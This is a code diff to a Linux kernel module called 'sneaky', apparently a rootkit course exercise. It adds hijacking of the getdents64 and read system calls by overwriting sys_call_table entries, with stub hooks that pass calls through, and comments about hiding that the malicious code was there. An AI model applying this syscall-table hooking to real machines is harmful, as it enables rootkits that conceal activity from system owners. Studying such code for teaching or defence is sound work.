@@ -36,6 +36,8 @@ int disable_page_rw(void *ptr) {
 // 2. The asmlinkage keyword is a GCC #define that indicates this function
 //    should expect it find its arguments on the stack (not in registers).
 asmlinkage int (*original_openat)(struct pt_regs *);
+asmlinkage int (*original_getdents)(struct pt_regs *);
+asmlinkage ssize_t (*original_read)(struct pt_regs *);
 
 // Define your new sneaky version of the 'openat' syscall
 asmlinkage int sneaky_sys_openat(struct pt_regs *regs) {
@@ -43,11 +45,21 @@ asmlinkage int sneaky_sys_openat(struct pt_regs *regs) {
 
 
 
-
-
-
-
     return (*original_openat)(regs);
+}
+
+asmlinkage int sneaky_sys_getdents(struct pt_regs *regs) {
+
+
+
+    return (*original_getdents)(regs);
+}
+
+asmlinkage ssize_t sneaky_sys_read(struct pt_regs *regs) {
+
+
+
+    return (*original_read)(regs);
 }
 
 // The code that gets executed when the module is loaded
@@ -71,9 +83,10 @@ static int initialize_sneaky_module(void) {
     sys_call_table[__NR_openat] = (unsigned long) sneaky_sys_openat;
 
     // You need to replace other system calls you need to hack here
-
-
-
+    original_getdents = (void *) sys_call_table[__NR_getdents64];
+    original_read = (void *) sys_call_table[__NR_read];
+    sys_call_table[__NR_getdents64] = (unsigned long) sneaky_sys_getdents;
+    sys_call_table[__NR_read] = (unsigned long) sneaky_sys_read;
 
 
 
@@ -94,6 +107,9 @@ static void exit_sneaky_module(void) {
     // This is more magic! Restore the original 'open' system call
     // function address. Will look like malicious code was never there!
     sys_call_table[__NR_openat] = (unsigned long) original_openat;
+    sys_call_table[__NR_getdents64] = (unsigned long) original_getdents;
+    sys_call_table[__NR_read] = (unsigned long) original_read;
+
 
     // Turn write protection mode back on for sys_call_table
     disable_page_rw((void *) sys_call_table);
